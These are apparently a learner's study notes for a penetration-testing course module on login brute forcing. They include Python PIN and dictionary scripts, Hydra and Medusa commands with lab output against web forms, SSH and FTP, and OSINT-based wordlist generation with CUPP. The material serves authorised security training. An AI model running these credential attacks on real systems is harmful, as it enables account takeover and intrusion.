# Module 16 — Login Brute Forcing

**Platform:** HTB Academy | **Path:** CPTS | **Difficulty:** Easy  
**Status:** ✅ Complete | **Date:** August 2026

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Password Security Fundamentals](#2-password-security-fundamentals)
3. [Brute Force Attacks](#3-brute-force-attacks)
4. [Dictionary Attacks](#4-dictionary-attacks)
5. [Hybrid Attacks](#5-hybrid-attacks)
6. [Hydra](#6-hydra)
7. [Basic HTTP Authentication](#7-basic-http-authentication)
8. [Login Forms](#8-login-forms)
9. [Medusa](#9-medusa)
10. [Web Services — SSH & FTP](#10-web-services--ssh--ftp)
11. [Custom Wordlists](#11-custom-wordlists)

---

## 1. Introduction

Brute forcing is a trial-and-error method used to crack passwords, login credentials, or encryption keys by systematically trying every possible combination until the correct one is found. Success depends on:

- **Password complexity** — longer passwords with mixed character sets are exponentially harder to crack
- **Computational power** — modern hardware can try billions of combinations per second
- **Security controls** — account lockouts, CAPTCHAs, and rate limiting can slow or block attempts

### Types of Brute Forcing

| Method | Description | Best Used When |
|---|---|---|
| Simple Brute Force | Tries all possible combinations within a defined character set and length | No prior info about the password, abundant resources |
| Dictionary Attack | Uses a pre-compiled list of common words/passwords | Target likely uses a weak or guessable password |
| Hybrid Attack | Combines dictionary + brute force, mutates words with numbers/symbols | Target modifies common passwords per policy requirements |
| Credential Stuffing | Leverages leaked credentials from one service against others | Large set of leaked creds available, password reuse suspected |
| Password Spraying | Tries a small set of common passwords against many usernames | Account lockout policies in place, spreading attempts to avoid detection |
| Rainbow Table Attack | Uses pre-computed hash tables to reverse password hashes quickly | Large number of hashes to crack, storage available |
| Reverse Brute Force | Single password tried against many usernames | Strong suspicion a specific password is reused across accounts |
| Distributed Brute Force | Workload spread across multiple machines | Target password is highly complex, single machine insufficient |

### Role in Penetration Testing

Brute forcing is strategically employed when:
- Other avenues (known vulns, social engineering) are exhausted
- Password policies are weak, increasing likelihood of guessable passwords
- Specific high-value accounts (e.g., admin, service accounts) are targeted

---

## 2. Password Security Fundamentals

### Anatomy of a Strong Password (NIST Guidelines)

- **Length** — minimum 12 characters; every additional character multiplies possible combinations
  - 6-char lowercase: `26^6` ≈ 300 million combos
  - 8-char lowercase: `26^8` ≈ 200 billion combos
- **Complexity** — uppercase + lowercase + numbers + symbols expands the character pool per position
- **Uniqueness** — every account needs its own password; reuse creates a domino effect
- **Randomness** — avoid dictionary words, personal info, or predictable patterns

### Common Weaknesses

- Short passwords (< 8 characters)
- Dictionary words, names, common phrases
- Personal information (birthdate, pet name, address)
- Password reuse across multiple accounts
- Predictable patterns: `qwerty`, `123456`, `p@ssw0rd`

### Default Credentials

Default passwords are a critical, often overlooked vulnerability. Attackers compile lists of manufacturer defaults and try them first — requiring no brute force at all.

| Device | Default Username | Default Password |
|---|---|---|
| Linksys Router | admin | admin |
| Cisco Router | cisco | cisco |
| Netgear Router | admin | password |
| Axis IP Camera | root | pass |
| Ubiquiti UniFi AP | ubnt | ubnt |
| Hikvision DVR | admin | 12345 |

Default usernames (admin, root, user) are equally dangerous — knowing the username means the attacker only needs to crack the password, cutting the search space in half.

Key resource: [SecLists top-usernames-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)

---

## 3. Brute Force Attacks

### Search Space Formula

```
Possible Combinations = Character Set Size ^ Password Length
```

| Scenario | Length | Character Set | Combinations |
|---|---|---|---|
| Short and Simple | 6 | Lowercase (a-z) | 26^6 = 308,915,776 |
| Longer but Simple | 8 | Lowercase (a-z) | 26^8 = 208,827,064,576 |
| Adding Complexity | 8 | Lower + Uppercase | 52^8 = 53,459,728,531,456 |
| Maximum Complexity | 12 | Lower + Upper + Numbers + Symbols | 94^12 ≈ 475 quintillion |

Even a supercomputer doing 1 trillion guesses/second would take ~15,000 years to crack a 12-character full-ASCII password.

### Lab — PIN Brute Force

The lab exposes a `/pin` endpoint accepting a 4-digit PIN as a query parameter. A correct PIN returns a flag.

**Script (`pin-solver.py`):**

```python
import requests

ip = "10.129.x.x"   # target IP
port = 1234          # target port

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    print(f"Attempted PIN: {formatted_pin}")
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

```shell-session
Jay_Patel_001@htb[/htb]$ python pin-solver.py

...
Attempted PIN: [redacted]
Correct PIN found: [redacted]
Flag: HTB{flag_redacted}
```

The script iterates 0000–9999 via GET requests and stops on the first response containing the `flag` key.

---

## 4. Dictionary Attacks

### Why Dictionary Attacks Work

Humans prioritize memorable passwords over secure ones — dictionary words, names, common phrases, predictable patterns. A well-crafted wordlist exploits this tendency, dramatically reducing the search space vs. pure brute force.

### Brute Force vs. Dictionary Attack

| Feature | Dictionary Attack | Brute Force |
|---|---|---|
| Efficiency | Fast — narrows search space with a pre-defined list | Can be extremely slow for complex passwords |
| Targeting | Adaptable — can be tailored to specific targets | No inherent targeting |
| Effectiveness | Excellent against weak/common passwords | Effective against all passwords given enough time |
| Limitation | Fails against truly random passwords | Impractical for long/complex passwords |

### Key Wordlists

| Wordlist | Description | Source |
|---|---|---|
| `rockyou.txt` | Millions of passwords from the RockYou breach | Pre-installed on Pwnbox / ParrotSec |
| `top-usernames-shortlist.txt` | Most common usernames | SecLists |
| `xato-net-10-million-usernames.txt` | 10 million usernames | SecLists |
| `2023-200_most_used_passwords.txt` | 200 most used passwords (2023) | SecLists |
| `default-passwords.txt` | Default credentials for routers/devices | SecLists |

### Lab — Dictionary Attack

**Script (`dictionary-solver.py`):**

```python
import requests

ip = "10.129.x.x"
port = 1234

passwords = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"
).text.splitlines()

for password in passwords:
    print(f"Attempted password: {password}")
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

```shell-session
Jay_Patel_001@htb[/htb]$ python3 dictionary-solver.py

...
Correct password found: [redacted]
Flag: HTB{flag_redacted}
```

---

## 5. Hybrid Attacks

### The Problem They Solve

Organizations force periodic password changes, but users typically make minimal modifications — appending a year, number, or special character:

```
Summer2023  →  Summer2023!  →  Summer2024
```

Hybrid attacks combine dictionary + brute force: try wordlist entries first, then systematically mutate them.

### Filtering Wordlists to Match Password Policy

If the policy requires: min 8 chars, at least one uppercase, one lowercase, one number:

```shell-session
Jay_Patel_001@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt

Jay_Patel_001@htb[/htb]$ grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt
Jay_Patel_001@htb[/htb]$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
Jay_Patel_001@htb[/htb]$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
Jay_Patel_001@htb[/htb]$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
Jay_Patel_001@htb[/htb]$ wc -l darkweb2017-number.txt

89 darkweb2017-number.txt
```

10,000 passwords filtered down to 89 matching the policy — a drastically smaller, more focused attack list.

### Credential Stuffing

Exploits password reuse: credentials leaked from one service are tested against others (social media, email, banking). Attackers automate this with tools or scripts mimicking normal user behaviour to avoid detection. Core defence: unique passwords per account + MFA.

---

## 6. Hydra

Hydra is a fast, parallel network login cracker supporting a wide range of protocols.

### Installation

```shell-session
Jay_Patel_001@htb[/htb]$ hydra -h
# or install:
Jay_Patel_001@htb[/htb]$ sudo apt-get -y install hydra
```

### Basic Syntax

```shell-session
Jay_Patel_001@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
```

### Key Parameters

| Parameter | Explanation | Example |
|---|---|---|
| `-l LOGIN` / `-L FILE` | Single username or username file | `-l admin` / `-L users.txt` |
| `-p PASS` / `-P FILE` | Single password or password file | `-p password123` / `-P passes.txt` |
| `-t TASKS` | Number of parallel threads | `-t 4` |
| `-f` | Stop after first valid login found | `-f` |
| `-s PORT` | Non-default port | `-s 2222` |
| `-v` / `-V` | Verbose / very verbose output | `-V` |
| `service://server` | Target service and host | `ssh://192.168.1.100` |

### Supported Services

| Service | Protocol | Example Command |
|---|---|---|
| `ftp` | FTP | `hydra -l admin -P passes.txt ftp://192.168.1.100` |
| `ssh` | SSH | `hydra -l root -P passes.txt ssh://192.168.1.100` |
| `http-get` / `http-post-form` | HTTP | `hydra -l admin -P passes.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` |
| `rdp` | Remote Desktop | `hydra -l administrator -P passes.txt rdp://192.168.1.100` |
| `smtp` | Email (SMTP) | `hydra -l admin -P passes.txt smtp://mail.server.com` |
| `mysql` | MySQL | `hydra -l root -P passes.txt mysql://192.168.1.100` |
| `vnc` | VNC | `hydra -P passes.txt vnc://192.168.1.100` |

### Common Hydra Examples

```shell-session
# HTTP Basic Auth
Jay_Patel_001@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get

# Multiple SSH servers from file
Jay_Patel_001@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh

# FTP on non-standard port with verbose output
Jay_Patel_001@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp

# Web login form
Jay_Patel_001@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# RDP with generated password range (6-8 chars, alphanumeric)
Jay_Patel_001@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

---

## 7. Basic HTTP Authentication

### How Basic Auth Works

1. User requests a protected resource
2. Server responds with `401 Unauthorized` + `WWW-Authenticate` header
3. Browser prompts for credentials
4. Browser concatenates `username:password`, Base64-encodes it, sends in `Authorization: Basic <encoded>` header
5. Server decodes, verifies, grants or denies access

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

### Lab — Exploiting Basic Auth with Hydra

Target: known username `basic-auth-user`, unknown password.

```shell-session
# Download wordlist
Jay_Patel_001@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt

# Hydra attack
Jay_Patel_001@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 10.129.x.x http-get / -s 81

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://10.129.x.x:81/
[81][http-get] host: 10.129.x.x   login: basic-auth-user   password: [redacted]
1 of 1 target successfully completed, 1 valid password found
```

**Command breakdown:**
- `-l basic-auth-user` — known username
- `-P 2023-200_most_used_passwords.txt` — password wordlist
- `http-get /` — HTTP GET against root path
- `-s 81` — non-default port 81

---

## 8. Login Forms

### Understanding Form Structure

Login forms submit credentials via `POST` request. A typical form:

```html
<form action="/login" method="post">
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="submit" value="Submit">
</form>
```

Resulting POST request:

```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=john&password=secret123
```

### Hydra `http-post-form` Module

```shell-session
Jay_Patel_001@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
```

**Condition strings:**
- `F=Invalid credentials` — failure condition: Hydra marks attempt failed if this string appears in response
- `S=302` — success condition: HTTP 302 redirect indicates successful login
- `S=Dashboard` — success condition: specific text appears in response on success

### Gathering Intelligence — Before Running Hydra

**Method 1 — Manual HTML inspection** (browser DevTools → Inspect):
- Find form `method` (POST/GET)
- Find input field `name` attributes (e.g., `username`, `password`)
- Identify form submission path

**Method 2 — Network tab** (F12 → Network → submit a test login):
- See the actual POST request path and parameters
- Confirm field names and failure message

**Method 3 — Proxy interception** (Burp Suite / ZAP):
- Capture the exact POST request
- See all parameters including hidden CSRF tokens

### Constructing the `params` String

From inspecting the lab target:
- Form submits to `/`
- Fields: `username`, `password`
- Failed login shows: `Invalid credentials`

```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

### Lab — Brute-Forcing a Login Form

```shell-session
# Download wordlists
Jay_Patel_001@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
Jay_Patel_001@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

# Hydra attack
Jay_Patel_001@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 10.129.x.x -s PORT http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-post-form://10.129.x.x:PORT/:username=^USER^&password=^PASS^:F=Invalid credentials
[PORT][http-post-form] host: 10.129.x.x   login: [redacted]   password: [redacted]
[STATUS] attack finished for 10.129.x.x (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

---

## 9. Medusa

Medusa is a fast, massively parallel, modular login brute-forcer designed for remote authentication services.

### Installation

```shell-session
Jay_Patel_001@htb[/htb]$ medusa -h
# or install:
Jay_Patel_001@htb[/htb]$ sudo apt-get -y install medusa
```

### Basic Syntax

```shell-session
Jay_Patel_001@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
```

### Key Parameters

| Parameter | Explanation | Example |
|---|---|---|
| `-h HOST` / `-H FILE` | Single host or host file | `-h 192.168.1.10` / `-H targets.txt` |
| `-u USERNAME` / `-U FILE` | Single username or file | `-u admin` / `-U usernames.txt` |
| `-p PASSWORD` / `-P FILE` | Single password or file | `-p pass123` / `-P passwords.txt` |
| `-M MODULE` | Attack module | `-M ssh` |
| `-m "OPTION"` | Module-specific options | `-m "POST /login.php:user=^USER^&pass=^PASS^:F=Invalid"` |
| `-t TASKS` | Parallel login attempts | `-t 4` |
| `-f` / `-F` | Stop on first success (current host / any host) | `-f` |
| `-n PORT` | Non-default port | `-n 2222` |
| `-v LEVEL` | Verbosity level (0–6) | `-v 4` |
| `-e ns` | Test empty passwords (`n`) and password = username (`s`) | `-e ns` |

### Supported Modules

| Module | Service | Example |
|---|---|---|
| `ssh` | SSH | `medusa -M ssh -h 192.168.1.100 -u root -P passes.txt` |
| `ftp` | FTP | `medusa -M ftp -h 192.168.1.100 -u admin -P passes.txt` |
| `http` | HTTP GET/POST | `medusa -M http -h www.example.com -U users.txt -P passes.txt -m DIR:/login.php` |
| `rdp` | Remote Desktop | `medusa -M rdp -h 192.168.1.100 -u admin -P passes.txt` |
| `mysql` | MySQL | `medusa -M mysql -h 192.168.1.100 -u root -P passes.txt` |
| `vnc` | VNC | `medusa -M vnc -h 192.168.1.100 -P passes.txt` |
| `web-form` | Web Login Form | `medusa -M web-form -h www.example.com -U users.txt -P passes.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"` |

---

## 10. Web Services — SSH & FTP

### Lab Overview

Two-stage attack: brute-force SSH → pivot inside box → discover FTP → brute-force FTP → retrieve flag.

### Stage 1 — SSH Brute Force with Medusa

Known username: `sshuser`

```shell-session
Jay_Patel_001@htb[/htb]$ medusa -h 10.129.x.x -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
...
ACCOUNT FOUND: [ssh] Host: 10.129.x.x User: sshuser Password: [redacted] [SUCCESS]
```

**Parameters:**
- `-h` / `-n` — target IP and port
- `-u sshuser` — known username
- `-P` — password wordlist
- `-M ssh` — SSH module
- `-t 3` — 3 parallel threads (low to avoid triggering lockouts)

### Stage 2 — Connect via SSH

```shell-session
Jay_Patel_001@htb[/htb]$ ssh sshuser@10.129.x.x -p PORT
```

### Stage 3 — Internal Reconnaissance

Inside the SSH session, check for additional services:

```shell-session
Jay_Patel_001@htb[/htb]$ netstat -tulpn | grep LISTEN

tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 :::21                   :::*                    LISTEN

Jay_Patel_001@htb[/htb]$ nmap localhost

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

FTP server running on port 21 — internal only (not exposed externally).

### Stage 4 — FTP Brute Force

Found `/home/ftpuser` directory → username likely `ftpuser`.

```shell-session
Jay_Patel_001@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2023-200_most_used_passwords.txt -M ftp -t 5

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
...
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: [redacted] Password: [redacted] [SUCCESS]
```

Using `-h 127.0.0.1` targets the loopback explicitly (forces IPv4).

### Stage 5 — Retrieve Flag via FTP

```shell-session
Jay_Patel_001@htb[/htb]$ ftp ftp://ftpuser:[redacted]@localhost

Connected to localhost.
220 (vsFTPd 3.0.5)
230 Login successful.
ftp> ls
-rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt
ftp> get flag.txt
226 Transfer complete.
ftp> exit

Jay_Patel_001@htb[/htb]$ cat flag.txt
HTB{flag_redacted}
```

---

## 11. Custom Wordlists

Generic wordlists cast a wide net. Custom wordlists tailored to a specific target dramatically improve efficiency and success rate.

### Username Anarchy

Automates username generation from a target's name, covering initials, common substitutions, leetspeak, and format variations.

```shell-session
Jay_Patel_001@htb[/htb]$ sudo apt install ruby -y
Jay_Patel_001@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
Jay_Patel_001@htb[/htb]$ cd username-anarchy

Jay_Patel_001@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Generates combinations like: `janesmith`, `j.smith`, `smithjane`, `jane.s`, `js`, `j4n3`, `5m1th`, `FLast`, `First.Last`, etc.

### CUPP — Common User Passwords Profiler

Generates personalised password wordlists based on OSINT about a target (social media, public records, company info).

```shell-session
Jay_Patel_001@htb[/htb]$ sudo apt install cupp -y
Jay_Patel_001@htb[/htb]$ cupp -i
```

CUPP asks for:
- First/last name, nickname, birthdate
- Partner details (name, nickname, birthdate)
- Children, pets, company, keywords
- Special chars, numbers, leet mode toggles

**Example profile for Jane Smith:**

| Field | Details |
|---|---|
| Name | Jane Smith |
| Nickname | Janey |
| Birthdate | 11/12/1990 |
| Partner | Jim (Jimbo) — 12/12/1990 |
| Pet | Spot |
| Company | AHI |
| Keywords | hacker, blue |

CUPP generates mutations including: original + capitalized, reversed, birthdate variations, concatenations, special char appends, number appends, leetspeak substitutions, combined mutations — resulting in ~46,000 candidate passwords.

### Filtering Generated List Against Password Policy

If policy requires: min 6 chars, 1 uppercase, 1 lowercase, 1 number, 2+ special chars (`!@#$%^&*`):

```shell-session
Jay_Patel_001@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

Reduces ~46,000 → ~7,900 passwords that actually match the policy.

### Full Attack — Custom Lists + Hydra

```shell-session
Jay_Patel_001@htb[/htb]$ hydra -L jane_smith_usernames.txt -P jane-filtered.txt 10.129.x.x -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790)
[DATA] attacking http-post-form://10.129.x.x:PORT/:username=^USER^&password=^PASS^:Invalid credentials
[PORT][http-post-form] host: 10.129.x.x   login: [redacted]   password: [redacted]
[STATUS] attack finished for 10.129.x.x (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

---

## Key Takeaways

| Technique | Tool | Best For |
|---|---|---|
| PIN / simple brute force | Custom Python script | Small key space (4-digit PIN = 10,000 combos) |
| Dictionary attack | Python + requests | Common passwords against web endpoints |
| Wordlist filtering | `grep` + regex | Narrowing wordlists to match a target's password policy |
| HTTP Basic Auth | Hydra `http-get` | Services using RFC 7617 Basic Auth |
| Web login forms | Hydra `http-post-form` | Custom POST-based login pages |
| SSH brute force | Medusa `-M ssh` | Remote access services with known/guessable username |
| FTP brute force | Medusa `-M ftp` | Internal file services discovered post-compromise |
| Username generation | Username Anarchy | When you know the target's name but not their username format |
| Password profiling | CUPP | When you have OSINT on the target (DOB, pets, company, interests) |

**OSCP/CPTS note:** Always confirm scope and obtain explicit written permission before brute-forcing any target. Use `-t` (Hydra) and `-t` (Medusa) conservatively to avoid triggering account lockouts or IDS/IPS alerts.
